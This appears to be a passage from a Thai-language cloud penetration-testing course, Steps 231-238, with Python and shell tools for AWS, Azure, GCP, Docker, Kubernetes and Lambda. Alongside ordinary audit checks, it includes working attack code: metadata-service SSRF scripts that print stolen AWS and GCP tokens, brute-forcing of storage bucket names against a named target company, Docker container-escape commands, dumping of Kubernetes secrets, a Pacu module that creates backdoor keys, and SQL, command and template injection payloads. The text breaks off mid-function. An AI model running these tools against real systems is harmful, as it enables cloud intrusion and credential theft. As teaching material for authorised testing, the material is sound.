# Part 24: Cloud Security Testing (Steps 231-240)

## ภาพรวม
ส่วนนี้ครอบคลุมการทดสอบความปลอดภัยบน Cloud Infrastructure รวมถึง AWS, Azure, GCP, Container Security (Docker/Kubernetes), Serverless Security และ Cloud Storage Misconfigurations

---

## Step 231: AWS Security Testing

### AWS Attack Surface
```
AWS Security Domains:
┌───────────────────────────────────────────────┐
│  IAM           Storage         Network         │
│  - Overprivileged - S3 public   - Security      │
│    users         buckets         Groups open    │
│  - Key exposure - EBS snapshots - VPC peering   │
│  - Role abuse  - Glacier        - Public EC2    │
│                                                 │
│  Compute       Serverless       Management      │
│  - EC2 metadata- Lambda env vars- CloudTrail    │
│  - ECS tasks  - API Gateway     - Config rules  │
│  - EKS escape - Function perms  - GuardDuty     │
└───────────────────────────────────────────────┘
```

### AWS Security Testing Tools
```bash
# ติดตั้ง AWS CLI
pip3 install awscli
aws configure

# ติดตั้ง Pacu - AWS exploitation framework
pip3 install pacu
pacu

# ติดตั้ง ScoutSuite - cloud security auditing
pip3 install scoutsuite
scout aws

# ติดตั้ง Prowler - AWS security assessment
pip3 install prowler
prowler -M json

# ติดตั้ง CloudMapper
git clone https://github.com/duo-labs/cloudmapper
cd cloudmapper && pip3 install -r requirements.txt
```

### AWS IAM Security Testing
```python
#!/usr/bin/env python3
# aws_iam_tester.py

import boto3
import json
from botocore.exceptions import ClientError

class AWSIAMTester:
    def __init__(self, profile='default', region='us-east-1'):
        self.session = boto3.Session(profile_name=profile, region_name=region)
        self.iam = self.session.client('iam')
        self.sts = self.session.client('sts')
        self.findings = []
    
    def get_current_identity(self):
        """ดูว่าเราเป็นใคร"""
        identity = self.sts.get_caller_identity()
        print(f"[*] Account: {identity['Account']}")
        print(f"[*] ARN: {identity['Arn']}")
        print(f"[*] UserId: {identity['UserId']}")
        return identity
    
    def enumerate_iam_permissions(self):
        """เดาะสู่ IAM permissions ที่มี"""
        print("[*] Enumerating IAM permissions...")
        
        test_actions = [
            ('iam', 'list_users', {}),
            ('iam', 'list_roles', {}),
            ('iam', 'list_policies', {'Scope': 'Local'}),
            ('s3', 'list_buckets', {}),
            ('ec2', 'describe_instances', {}),
            ('lambda', 'list_functions', {}),
            ('secretsmanager', 'list_secrets', {}),
            ('ssm', 'describe_parameters', {}),
        ]
        
        allowed = []
        denied = []
        
        for service, action, kwargs in test_actions:
            try:
                client = self.session.client(service)
                getattr(client, action)(**kwargs)
                allowed.append(f"{service}:{action}")
                print(f"[+] ALLOWED: {service}:{action}")
            except ClientError as e:
                if e.response['Error']['Code'] in ['AccessDenied', 'UnauthorizedAccess']:
                    denied.append(f"{service}:{action}")
                else:
                    allowed.append(f"{service}:{action} (other error)")
        
        return allowed, denied
    
    def check_iam_misconfigurations(self):
        """ตรวจสอบ IAM misconfigurations"""
        print("[*] Checking IAM misconfigurations...")
        
        # ตรวจสอบ users ที่ไม่ใช้ MFA
        try:
            paginator = self.iam.get_paginator('list_users')
            for page in paginator.paginate():
                for user in page['Users']:
                    try:
                        mfa = self.iam.list_mfa_devices(UserName=user['UserName'])
                        if not mfa['MFADevices']:
                            self.findings.append({
                                'severity': 'High',
                                'resource': user['Arn'],
                                'issue': 'No MFA enabled'
                            })
                            print(f"[!] No MFA: {user['UserName']}")
                    except ClientError:
                        pass
        except ClientError as e:
            print(f"[-] Cannot list users: {e}")
        
        # ตรวจสอบ access keys เก่
        try:
            paginator = self.iam.get_paginator('list_users')
            for page in paginator.paginate():
                for user in page['Users']:
                    try:
                        keys = self.iam.list_access_keys(UserName=user['UserName'])
                        for key in keys['AccessKeyMetadata']:
                            from datetime import datetime, timezone
                            age = (datetime.now(timezone.utc) - key['CreateDate']).days
                            if age > 90:
                                self.findings.append({
                                    'severity': 'Medium',
                                    'resource': user['Arn'],
                                    'issue': f'Old access key ({age} days)'
                                })
                                print(f"[!] Old key ({age}d): {user['UserName']}")
                    except ClientError:
                        pass
        except ClientError:
            pass
    
    def exploit_metadata_service(self):
        """ทดสอบ SSRF -> AWS Metadata Service"""
        print("[*] Testing AWS Metadata Service access...")
        
        import requests
        
        # IMDSv1 (no token required)
        metadata_endpoints = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/dynamic/instance-identity/document'
        ]
        
        for url in metadata_endpoints:
            try:
                resp = requests.get(url, timeout=3)
                if resp.status_code == 200:
                    print(f"[+] Accessible: {url}")
                    print(f"    {resp.text[:200]}")
            except requests.exceptions.Timeout:
                print(f"[-] Timeout: {url}")
            except Exception as e:
                print(f"[-] Error: {e}")
    
    def check_s3_public_buckets(self):
        """ตรวจสอบ S3 buckets ที่เปิดสาธารณะ"""
        print("[*] Checking S3 public buckets...")
        
        s3 = self.session.client('s3')
        
        try:
            buckets = s3.list_buckets()['Buckets']
            
            for bucket in buckets:
                name = bucket['Name']
                try:
                    # ตรวจสอป Public Access Block
                    pab = s3.get_public_access_block(Bucket=name)
                    config = pab['PublicAccessBlockConfiguration']
                    
                    if not all(config.values()):
                        print(f"[!] Bucket may be public: {name}")
                    
                    # ตรวจสอบ ACL
                    acl = s3.get_bucket_acl(Bucket=name)
                    for grant in acl['Grants']:
                        grantee = grant.get('Grantee', {})
                        if grantee.get('URI', '') in [
                            'http://acs.amazonaws.com/groups/global/AllUsers',
                            'http://acs.amazonaws.com/groups/global/AuthenticatedUsers'
                        ]:
                            print(f"[!] Public bucket: {name} - {grant['Permission']}")
                            self.findings.append({
                                'severity': 'Critical',
                                'resource': f's3://{name}',
                                'issue': f'Public {grant["Permission"]} access'
                            })
                
                except ClientError as e:
                    if e.response['Error']['Code'] != 'NoSuchPublicAccessBlockConfiguration':
                        pass
        
        except ClientError as e:
            print(f"[-] Cannot list buckets: {e}")

# การใช้งาน
if __name__ == '__main__':
    tester = AWSIAMTester()
    tester.get_current_identity()
    tester.enumerate_iam_permissions()
    tester.check_iam_misconfigurations()
    tester.check_s3_public_buckets()
```

### Pacu Commands สำหรับ AWS Exploitation
```bash
# เริ่ม Pacu session
pacu

# ใน Pacu:
set_keys  # ตั้ง AWS keys
whoami    # ดู identity
run iam__enum_permissions
run iam__privesc_scan  # หาเส้นทาง privilege escalation
run s3__enum           # Enumerate S3
run lambda__enum       # Enumerate Lambda
run ec2__enum          # Enumerate EC2
run iam__backdoor_users_keys  # สร้าง backdoor keys
```

---

## Step 232: S3 Bucket Enumeration และ Exploitation

### S3 Security Testing
```python
#!/usr/bin/env python3
# s3_security_tester.py

import boto3
import requests
from botocore import UNSIGNED
from botocore.config import Config
import threading
from queue import Queue

class S3SecurityTester:
    def __init__(self, company_name):
        self.company = company_name
        # Client โดยไม่ต้อง authenticate
        self.s3_unauth = boto3.client(
            's3',
            config=Config(signature_version=UNSIGNED),
            region_name='us-east-1'
        )
        self.found_buckets = []
    
    def generate_bucket_names(self):
        """สร้าง bucket name variations"""
        templates = [
            self.company,
            f"{self.company}-prod",
            f"{self.company}-dev",
            f"{self.company}-staging",
            f"{self.company}-backup",
            f"{self.company}-data",
            f"{self.company}-files",
            f"{self.company}-assets",
            f"{self.company}-media",
            f"{self.company}-logs",
            f"{self.company}-db",
            f"{self.company}-database",
            f"{self.company}-private",
            f"{self.company}-internal",
            f"{self.company}-public",
            f"dev-{self.company}",
            f"prod-{self.company}",
            f"test-{self.company}",
            f"{self.company}.com"
        ]
        return templates
    
    def check_bucket_exists(self, bucket_name):
        """ตรวจสอบว่า bucket มีอยู่"""
        try:
            url = f"https://{bucket_name}.s3.amazonaws.com/"
            resp = requests.head(url, timeout=5)
            
            if resp.status_code == 200:
                return 'public'
            elif resp.status_code == 403:
                return 'exists_private'
            elif resp.status_code == 404:
                return 'not_found'
            else:
                return f'status_{resp.status_code}'
        except Exception:
            return 'error'
    
    def enumerate_buckets_threaded(self):
        """สแกน buckets แบบ parallel"""
        names = self.generate_bucket_names()
        queue = Queue()
        
        for name in names:
            queue.put(name)
        
        def worker():
            while not queue.empty():
                name = queue.get()
                status = self.check_bucket_exists(name)
                
                if status in ['public', 'exists_private']:
                    print(f"[{'!' if status=='public' else '+'}] {name}: {status}")
                    self.found_buckets.append({'name': name, 'status': status})
                queue.task_done()
        
        threads = [threading.Thread(target=worker) for _ in range(10)]
        for t in threads:
            t.start()
        queue.join()
        for t in threads:
            t.join()
        
        return self.found_buckets
    
    def list_bucket_contents(self, bucket_name):
        """แสดงไฟล์ใน bucket"""
        print(f"[*] Listing contents of {bucket_name}...")
        
        try:
            # ลองโดยไม่ auth
            response = self.s3_unauth.list_objects_v2(Bucket=bucket_name)
            
            print(f"[!] Public bucket - {response.get('KeyCount', 0)} objects")
            
            for obj in response.get('Contents', [])[:20]:
                print(f"  - {obj['Key']} ({obj['Size']} bytes)")
            
            # ค้นหาไฟล์ที่น่าสนใจ
            interesting_keys = [
                k for k in [o['Key'] for o in response.get('Contents', [])]
                if any(x in k.lower() for x in [
                    'password', 'secret', 'key', 'token', 'backup',
                    'database', '.sql', '.env', 'credentials', 'config'
                ])
            ]
            
            if interesting_keys:
                print(f"\n[!] Interesting files found:")
                for k in interesting_keys:
                    print(f"    - {k}")
            
        except Exception as e:
            print(f"[-] Cannot list: {e}")
    
    def check_bucket_acl(self, bucket_name):
        """ตรวจ ACL ของ bucket"""
        try:
            acl = self.s3_unauth.get_bucket_acl(Bucket=bucket_name)
            print(f"\n[*] Bucket ACL for {bucket_name}:")
            for grant in acl['Grants']:
                grantee = grant.get('Grantee', {})
                print(f"  Grantee: {grantee}")
                print(f"  Permission: {grant['Permission']}")
        except Exception as e:
            print(f"[-] Cannot get ACL: {e}")

# การใช้งาน
if __name__ == '__main__':
    tester = S3SecurityTester('targetcompany')
    
    print("[*] Enumerating S3 buckets...")
    found = tester.enumerate_buckets_threaded()
    
    for bucket in found:
        if bucket['status'] == 'public':
            tester.list_bucket_contents(bucket['name'])
            tester.check_bucket_acl(bucket['name'])
```

---

## Step 233: Container Security (Docker)

### Docker Security Testing
```python
#!/usr/bin/env python3
# docker_security_tester.py

import subprocess
import json
import os

class DockerSecurityTester:
    def __init__(self):
        self.findings = []
    
    def audit_docker_daemon(self):
        """ตรวจสอบ Docker daemon configuration"""
        print("[*] Auditing Docker daemon...")
        
        # ตรวจสอบว่า Docker API เปิดอยู่บน network
        import socket
        docker_ports = [2375, 2376, 2377]
        
        for port in docker_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex(('127.0.0.1', port))
            if result == 0:
                print(f"[!] Docker API port {port} is open!")
                if port == 2375:
                    print("[!] CRITICAL: Unauthenticated Docker API exposed!")
                    self.findings.append({'severity': 'Critical', 'issue': f'Docker API on port {port}'})
            sock.close()
    
    def check_container_privileges(self):
        """ตรวจสอปว่า container ทำงานด้วย root"""
        print("[*] Checking container privileges...")
        
        try:
            result = subprocess.run(
                ['docker', 'ps', '-q'],
                capture_output=True, text=True
            )
            containers = result.stdout.strip().split('\n')
            
            for container_id in containers:
                if not container_id:
                    continue
                
                inspect = subprocess.run(
                    ['docker', 'inspect', container_id],
                    capture_output=True, text=True
                )
                config = json.loads(inspect.stdout)[0]
                
                # ตรวจสอบ privileged mode
                if config['HostConfig']['Privileged']:
                    name = config['Name']
                    print(f"[!] Privileged container: {name}")
                    self.findings.append({
                        'severity': 'Critical',
                        'resource': name,
                        'issue': 'Running in privileged mode'
                    })
                
                # ตรวจสอบ process user
                user = config['Config'].get('User', '')
                if not user or user in ['', '0', 'root']:
                    print(f"[!] Root user in container: {config['Name']}")
                
                # ตรวจสอบ volume mounts
                for mount in config.get('Mounts', []):
                    if mount['Source'] == '/':
                        print(f"[!] Root filesystem mounted: {config['Name']}")
                    elif '/etc' in mount['Source'] or '/proc' in mount['Source']:
                        print(f"[!] Sensitive mount: {mount['Source']} in {config['Name']}")
                
                # ตรวจสอบ Docker socket mount
                for mount in config.get('Mounts', []):
                    if 'docker.sock' in mount.get('Source', ''):
                        print(f"[!] Docker socket mounted in container: {config['Name']}")
                        print("[!] This allows container escape!")
        
        except Exception as e:
            print(f"[-] Error: {e}")
    
    def scan_image_vulnerabilities(self, image_name):
        """สแกน image vulnerabilities ด้วย trivy"""
        print(f"[*] Scanning image {image_name} for vulnerabilities...")
        
        try:
            result = subprocess.run(
                ['trivy', 'image', '--format', 'json', image_name],
                capture_output=True, text=True
            )
            
            if result.returncode == 0:
                data = json.loads(result.stdout)
                
                for result_item in data.get('Results', []):
                    vulns = result_item.get('Vulnerabilities', [])
                    critical = [v for v in vulns if v.get('Severity') == 'CRITICAL']
                    high = [v for v in vulns if v.get('Severity') == 'HIGH']
                    
                    print(f"  Critical: {len(critical)}, High: {len(high)}")
                    
                    for vuln in critical[:5]:
                        print(f"  [CRITICAL] {vuln['VulnerabilityID']}: {vuln['PkgName']}")
        
        except FileNotFoundError:
            print("[-] trivy not installed. Install: apt install trivy")
    
    def check_docker_bench_security(self):
        """รัน Docker Bench Security"""
        print("[*] Running Docker Bench Security...")
        
        cmd = """
        docker run --rm --net host --pid host --userns host --cap-add audit_control \\
          -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \\
          -v /etc:/etc:ro \\
          -v /usr/bin/containerd:/usr/bin/containerd:ro \\
          -v /usr/bin/runc:/usr/bin/runc:ro \\
          -v /usr/lib/systemd:/usr/lib/systemd:ro \\
          -v /var/lib:/var/lib:ro \\
          -v /var/run/docker.sock:/var/run/docker.sock:ro \\
          docker/docker-bench-security
        """
        print("[*] Command:")
        print(cmd)
    
    def attempt_container_escape(self):
        """เต็มเทคนิค container escape ที่รู้จัก"""
        print("[*] Checking for container escape vectors...")
        
        # Check 1: รันอยู่ใน container หรือเปล่า
        with open('/proc/1/cgroup') as f:
            content = f.read()
            if 'docker' in content or 'kubepods' in content:
                print("[*] Running inside container")
        
        # Check 2: Privileged check
        try:
            result = subprocess.run(['cat', '/proc/self/status'], capture_output=True, text=True)
            if 'CapEff:\t0000003fffffffff' in result.stdout:
                print("[!] Full capabilities - privileged container!")
                print("[*] Try: mount /dev/sda1 /mnt (escape via device access)")
        except:
            pass
        
        # Check 3: Docker socket
        if os.path.exists('/var/run/docker.sock'):
            print("[!] Docker socket accessible!")
            print("[*] Escape command:")
            print("    docker run -v /:/mnt --rm -it ubuntu chroot /mnt")
        
        # Check 4: Mounted host paths
        with open('/proc/mounts') as f:
            mounts = f.read()
            if '/host' in mounts or 'overlay' not in mounts:
                print("[*] Unusual mounts detected - check /proc/mounts")

# การใช้งาน
if __name__ == '__main__':
    tester = DockerSecurityTester()
    tester.audit_docker_daemon()
    tester.check_container_privileges()
    tester.attempt_container_escape()
```

---

## Step 234: Kubernetes Security Testing

### Kubernetes Security Assessment
```python
#!/usr/bin/env python3
# kubernetes_security_tester.py

import subprocess
import json
import requests

class KubernetesSecurityTester:
    def __init__(self, api_server=None, token=None):
        self.api_server = api_server or 'https://kubernetes.default.svc'
        self.token = token
        self.headers = {}
        if token:
            self.headers['Authorization'] = f'Bearer {token}'
    
    def check_api_server_access(self):
        """ตรวจสอปการเข้าถึง API server"""
        print("[*] Checking Kubernetes API server access...")
        
        endpoints = [
            '/api',
            '/api/v1',
            '/api/v1/namespaces',
            '/api/v1/pods',
            '/api/v1/secrets',
            '/api/v1/configmaps',
            '/apis/rbac.authorization.k8s.io/v1/clusterroles'
        ]
        
        for endpoint in endpoints:
            try:
                resp = requests.get(
                    f'{self.api_server}{endpoint}',
                    headers=self.headers,
                    verify=False,
                    timeout=5
                )
                
                if resp.status_code == 200:
                    print(f"[+] Accessible: {endpoint}")
                elif resp.status_code == 403:
                    print(f"[-] Forbidden: {endpoint}")
                elif resp.status_code == 401:
                    print(f"[-] Unauthorized: {endpoint}")
            except Exception as e:
                print(f"[-] Error on {endpoint}: {e}")
    
    def check_unauthenticated_access(self):
        """ตรวจสอบการเข้าถึงโดยไม่ต้อง authenticate"""
        print("[*] Testing unauthenticated Kubernetes API access...")
        
        public_k8s_ports = [6443, 8080, 8443, 10250, 10255]
        
        import socket
        for port in public_k8s_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            if sock.connect_ex(('127.0.0.1', port)) == 0:
                print(f"[!] K8s port {port} open")
                
                if port == 8080:  # Insecure port
                    resp = requests.get(f'http://127.0.0.1:8080/api', timeout=5)
                    if resp.status_code == 200:
                        print("[!] CRITICAL: Unauthenticated K8s API on port 8080!")
                
                elif port == 10255:  # Read-only kubelet
                    resp = requests.get(f'http://127.0.0.1:10255/pods', timeout=5)
                    if resp.status_code == 200:
                        print("[!] Read-only kubelet port accessible!")
            sock.close()
    
    def enumerate_rbac(self):
        """เดาะสู่ RBAC configuration"""
        print("[*] Enumerating RBAC...")
        
        try:
            result = subprocess.run(
                ['kubectl', 'auth', 'can-i', '--list'],
                capture_output=True, text=True
            )
            print(result.stdout)
            
            # ตรวจสอปการเข้าถึง secrets
            result = subprocess.run(
                ['kubectl', 'auth', 'can-i', 'get', 'secrets'],
                capture_output=True, text=True
            )
            
            if 'yes' in result.stdout:
                print("[!] Can access secrets!")
                # ดึง secrets
                secrets = subprocess.run(
                    ['kubectl', 'get', 'secrets', '-A', '-o', 'json'],
                    capture_output=True, text=True
                )
                if secrets.returncode == 0:
                    data = json.loads(secrets.stdout)
                    for item in data.get('items', [])[:5]:
                        print(f"  Secret: {item['metadata']['namespace']}/{item['metadata']['name']}")
        
        except FileNotFoundError:
            print("[-] kubectl not found")
    
    def check_pod_security(self):
        """ตรวจสอป Pod Security"""
        print("[*] Checking Pod security configurations...")
        
        try:
            result = subprocess.run(
                ['kubectl', 'get', 'pods', '-A', '-o', 'json'],
                capture_output=True, text=True
            )
            
            if result.returncode == 0:
                data = json.loads(result.stdout)
                
                for pod in data.get('items', []):
                    name = f"{pod['metadata']['namespace']}/{pod['metadata']['name']}"
                    spec = pod.get('spec', {})
                    
                    # ตรวจ security context
                    security_ctx = spec.get('securityContext', {})
                    if not security_ctx:
                        print(f"[*] No securityContext: {name}")
                    
                    for container in spec.get('containers', []):
                        c_ctx = container.get('securityContext', {})
                        
                        if c_ctx.get('privileged'):
                            print(f"[!] Privileged container in pod: {name}")
                        
                        if c_ctx.get('runAsUser') == 0 or not c_ctx.get('runAsNonRoot'):
                            print(f"[*] Running as root: {name}/{container['name']}")
                        
                        if c_ctx.get('allowPrivilegeEscalation', True):
                            print(f"[*] Privilege escalation allowed: {name}")
        
        except FileNotFoundError:
            print("[-] kubectl not found")
    
    def exploit_service_account(self):
        """เดาะสู่ Service Account token"""
        print("[*] Checking Service Account token...")
        
        token_file = '/var/run/secrets/kubernetes.io/serviceaccount/token'
        ca_file = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
        ns_file = '/var/run/secrets/kubernetes.io/serviceaccount/namespace'
        
        if all(map(lambda f: __import__('os').path.exists(f), [token_file, ca_file])):
            print("[!] Running inside Kubernetes pod!")
            
            with open(token_file) as f:
                token = f.read().strip()
            
            with open(ns_file) as f:
                namespace = f.read().strip()
            
            print(f"[*] Namespace: {namespace}")
            print(f"[*] Token (first 50 chars): {token[:50]}...")
            
            # ทดสอบ permissions
            result = subprocess.run(
                ['kubectl', '--token', token, 'auth', 'can-i', '--list'],
                capture_output=True, text=True
            )
            print(f"[*] Permissions:\n{result.stdout}")

# การใช้งาน
if __name__ == '__main__':
    tester = KubernetesSecurityTester()
    tester.check_api_server_access()
    tester.check_unauthenticated_access()
    tester.enumerate_rbac()
```

---

## Step 235: Serverless Security Testing

### Lambda และ Serverless Security
```python
#!/usr/bin/env python3
# serverless_security_tester.py

import boto3
import json
import requests
from botocore.exceptions import ClientError

class ServerlessSecurityTester:
    def __init__(self, profile='default', region='us-east-1'):
        self.session = boto3.Session(profile_name=profile, region_name=region)
        self.lambda_client = self.session.client('lambda')
        self.findings = []
    
    def enumerate_lambda_functions(self):
        """เดาะสู่ Lambda functions"""
        print("[*] Enumerating Lambda functions...")
        
        try:
            paginator = self.lambda_client.get_paginator('list_functions')
            
            for page in paginator.paginate():
                for func in page['Functions']:
                    name = func['FunctionName']
                    role = func.get('Role', '')
                    env_vars = func.get('Environment', {}).get('Variables', {})
                    
                    print(f"\n[*] Function: {name}")
                    print(f"    Runtime: {func.get('Runtime', 'N/A')}")
                    print(f"    Role: {role}")
                    
                    # ตรวจสอบ env vars
                    if env_vars:
                        print(f"    Environment vars:")
                        for k, v in env_vars.items():
                            print(f"      {k} = {v}")
                            
                            if any(word in k.lower() for word in [
                                'password', 'secret', 'key', 'token', 'api'
                            ]):
                                print(f"      [!] Sensitive env var: {k}")
                                self.findings.append({
                                    'severity': 'High',
                                    'function': name,
                                    'issue': f'Sensitive env var: {k}'
                                })
        
        except ClientError as e:
            print(f"[-] Error: {e}")
    
    def check_lambda_permissions(self, function_name):
        """ตรวจสอป Lambda permissions"""
        print(f"[*] Checking permissions for {function_name}...")
        
        try:
            policy = self.lambda_client.get_policy(FunctionName=function_name)
            policy_doc = json.loads(policy['Policy'])
            
            for statement in policy_doc.get('Statement', []):
                principal = statement.get('Principal', {})
                
                if principal == '*' or principal.get('AWS') == '*':
                    print(f"[!] Function {function_name} is publicly invocable!")
                    self.findings.append({
                        'severity': 'Critical',
                        'function': function_name,
                        'issue': 'Publicly invocable Lambda'
                    })
        
        except ClientError as e:
            if e.response['Error']['Code'] == 'ResourceNotFoundException':
                print(f"[*] No resource-based policy for {function_name}")
    
    def test_lambda_injection(self, function_name):
        """ทดสอบ injection ใน Lambda"""
        print(f"[*] Testing injection in {function_name}...")
        
        injection_payloads = [
            '{"username": "admin\' OR 1=1--", "password": "x"}',
            '{"cmd": "$(id)"}',
            '{"template": "{{7*7}}"}',
        ]
        
        for payload in injection_payloads:
            try:
                response = self.lambda_client.invoke(
                    FunctionName=function_name,
                    Payload=payload.encode()
                )
                
                result = json.loads(response['Payload'].read())
                print(f"[*] Payload: {payload[:50]}")
                print(f"    Response: {str(result)[:200]}")
            
            except Exception as e:
                print(f"[-] Error: {e}")
    
    def check_api_gateway(self):
        """ตรวจสอป API Gateway"""
        print("[*] Checking API Gateway configurations...")
        
        agw = self.session.client('apigateway')
        
        try:
            apis = agw.get_rest_apis()['items']
            
            for api in apis:
                print(f"\n[*] API: {api['name']} ({api['id']})")
                
                stages = agw.get_stages(restApiId=api['id'])['item']
                
                for stage in stages:
                    print(f"  Stage: {stage['stageName']}")
                    
                    # ตรวจสอป logging
                    if not stage.get('methodSettings', {}).get('*/*', {}).get('loggingLevel'):
                        print(f"  [!] No logging on stage {stage['stageName']}")
                    
                    # ตรวจสอป throttling
                    if not stage.get('defaultRouteSettings', {}).get('throttlingBurstLimit'):
                        print(f"  [!] No throttling on stage {stage['stageName']}")
                    
                    # สร้าง URL
                    url = f"https://{api['id']}.execute-api.{self.session.region_name}.amazonaws.com/{stage['stageName']}"
                    print(f"  URL: {url}")
        
        except ClientError as e:
            print(f"[-] Error: {e}")

# การใช้งาน
if __name__ == '__main__':
    tester = ServerlessSecurityTester()
    tester.enumerate_lambda_functions()
    tester.check_api_gateway()
```

---

## Step 236: Azure Security Testing

### Azure Security Assessment
```python
#!/usr/bin/env python3
# azure_security_tester.py

import subprocess
import json
import requests

class AzureSecurityTester:
    def __init__(self):
        self.findings = []
    
    def check_azure_login(self):
        """ตรวจสอป Azure login status"""
        result = subprocess.run(
            ['az', 'account', 'show'],
            capture_output=True, text=True
        )
        if result.returncode == 0:
            account = json.loads(result.stdout)
            print(f"[*] Logged in as: {account['user']['name']}")
            print(f"[*] Subscription: {account['name']}")
            return account
        else:
            print("[-] Not logged in to Azure")
            print("[*] Run: az login")
            return None
    
    def enumerate_azure_resources(self):
        """เดาะสู่ Azure resources"""
        print("[*] Enumerating Azure resources...")
        
        # Resource groups
        result = subprocess.run(
            ['az', 'group', 'list', '-o', 'json'],
            capture_output=True, text=True
        )
        
        if result.returncode == 0:
            groups = json.loads(result.stdout)
            for g in groups:
                print(f"[+] Resource Group: {g['name']} ({g['location']})")
        
        # Virtual machines
        result = subprocess.run(
            ['az', 'vm', 'list', '-o', 'json'],
            capture_output=True, text=True
        )
        
        if result.returncode == 0:
            vms = json.loads(result.stdout)
            for vm in vms:
                print(f"[+] VM: {vm['name']} - {vm['location']}")
        
        # Storage accounts
        result = subprocess.run(
            ['az', 'storage', 'account', 'list', '-o', 'json'],
            capture_output=True, text=True
        )
        
        if result.returncode == 0:
            accounts = json.loads(result.stdout)
            for acc in accounts:
                https_only = acc.get('enableHttpsTrafficOnly', True)
                if not https_only:
                    print(f"[!] HTTP traffic allowed: {acc['name']}")
                
                # Check public access
                public = acc.get('allowBlobPublicAccess', False)
                if public:
                    print(f"[!] Public blob access: {acc['name']}")
    
    def check_storage_containers(self, account_name):
        """ตรวจสอป Azure Blob Storage"""
        print(f"[*] Checking storage account: {account_name}")
        
        # ลองเข้าถึงโดยไม่ต้อง auth
        public_url = f"https://{account_name}.blob.core.windows.net"
        
        containers_to_try = [
            '$web', 'public', 'data', 'backup', 'uploads', 'media'
        ]
        
        for container in containers_to_try:
            url = f"{public_url}/{container}?restype=container&comp=list"
            resp = requests.get(url)
            
            if resp.status_code == 200:
                print(f"[!] Public container accessible: {container}")
                print(f"    URL: {url}")
            elif resp.status_code == 409:  # Conflict = exists but check
                print(f"[+] Container exists: {container}")
    
    def check_azure_ad_security(self):
        """ตรวจสอป Azure AD configuration"""
        print("[*] Checking Azure AD security...")
        
        # ดู service principals
        result = subprocess.run(
            ['az', 'ad', 'sp', 'list', '--all', '-o', 'json'],
            capture_output=True, text=True
        )
        
        if result.returncode == 0:
            sps = json.loads(result.stdout)
            print(f"[*] Service principals: {len(sps)}")
            
            for sp in sps[:5]:
                print(f"  - {sp.get('displayName', 'N/A')}: {sp.get('appId', 'N/A')}")

# การใช้งาน
if __name__ == '__main__':
    tester = AzureSecurityTester()
    tester.check_azure_login()
    tester.enumerate_azure_resources()
```

---

## Step 237: GCP Security Testing

### GCP Security Assessment
```bash
# ติดตั้ง gcloud
curl https://sdk.cloud.google.com | bash
exec -l $SHELL
gcloud init

# ตรวจสอป identity
gcloud auth list
gcloud config list
gcloud projects list

# เดาะสู่ GCP resources
gcloud compute instances list        # VMs
gcloud storage buckets list          # GCS buckets
gcloud functions list                 # Cloud Functions
gcloud sql instances list            # Cloud SQL
gcloud iam service-accounts list     # Service accounts
gcloud projects get-iam-policy PROJECT_ID  # IAM policies

# ตรวจสอป GCS bucket permissions
gsutil iam get gs://bucket-name
gsutil ls -la gs://bucket-name      # List bucket contents

# ตรวจสอบ allUsers access
gcloud storage buckets get-iam-policy gs://bucket-name | grep allUsers

# ติดตั้ง GCPBucketBrute
git clone https://github.com/RhinoSecurityLabs/GCPBucketBrute
python3 gcpbucketbrute.py -k target-company

# ติดตั้ง ScoutSuite สำหรับ GCP
pip3 install scoutsuite
scout gcp --project-id PROJECT_ID
```

### GCP Metadata Service Exploitation
```python
#!/usr/bin/env python3
# gcp_metadata_exploit.py

import requests

def exploit_gcp_metadata_ssrf(ssrf_url):
    """SSRF บน GCP Metadata Service"""
    metadata_base = 'http://metadata.google.internal/computeMetadata/v1/'
    
    headers = {'Metadata-Flavor': 'Google'}
    
    targets = [
        'instance/service-accounts/',
        'instance/service-accounts/default/token',
        'instance/service-accounts/default/email',
        'project/project-id',
        'instance/attributes/ssh-keys',
    ]
    
    for target in targets:
        metadata_url = f"{metadata_base}{target}"
        
        # SSRF through target app
        resp = requests.get(
            ssrf_url,
            params={'url': metadata_url},
            headers=headers
        )
        
        print(f"[*] {target}:")
        print(f"    {resp.text[:200]}")

# ทดสอบ
if __name__ == '__main__':
    # การเข้าถึง metadata โดยตรง (ถ้าอยู่ใน GCP)
    try:
        resp = requests.get(
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            headers={'Metadata-Flavor': 'Google'},
            timeout=5
        )
        print(f"[!] GCP Token: {resp.text}")
    except:
        print("[-] Not on GCP or metadata not accessible")
```

---

## Step 238: Cloud Storage Misconfiguration Testing

### Cloud Storage Security Scanner
```python
#!/usr/bin/env python3
# cloud_storage_scanner.py

import requests
import xml.etree.ElementTree as ET
import threading
from queue import Queue

class CloudStorageScanner:
    def __init__(self, target_company):
        self.company = target_company
        self.session = requests.Session()
        self.session.verify = False
        self.found = []
    
    def generate_names(self):
        """สร้าง storage names"""
        base = self.company.lower().replace(' ', '-')
        return [
            base, f"{base}-dev", f"{base}-prod", f"{base}-backup",
            f"{base}-data", f"{base}-assets", f"{base}-media",
            f"{base}-public", f"{base}-private", f"{base}-internal",
            f"dev.{base}", f"api.{base}", f"cdn.{base}"
        ]
    
    def check_aws_s3(self, name):
        """Check S3 bucket"""
        urls = [
            f'https://{name}.s3.amazonaws.com',
            f'https://s3.amazonaws.com/{name}'
        ]
        
        for url in urls:
            try:
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200:
                    print(f"[!] S3 PUBLIC: {url}")
                    self._parse_s3_listing(resp.text, url)
                    return True
                elif resp.status_code == 403:
                    print(f"[+] S3 EXISTS (private): {name}")
                    return True
            except:
                pass
        return False
    
    def check_azure_blob(self, name):
        """Check Azure Blob Storage"""
        url = f'https://{name}.blob.core.windows.net'
        containers = ['$web', 'public', 'data', 'uploads', 'assets', 'media']
        
        for container in containers:
            try:
                resp = self.session.get(
                    f'{url}/{container}?restype=container&comp=list',
                    timeout=5
                )
                if resp.status_code == 200:
                    print(f"[!] Azure Blob PUBLIC: {url}/{container}")
                    return True
                elif resp.status_code in [403, 409]:
                    print(f"[+] Azure Blob EXISTS: {name}/{container}")
            except:
                pass
        return False
    
    def check_gcp_storage(self, name):
        """Check GCP Cloud Storage"""
        urls = [
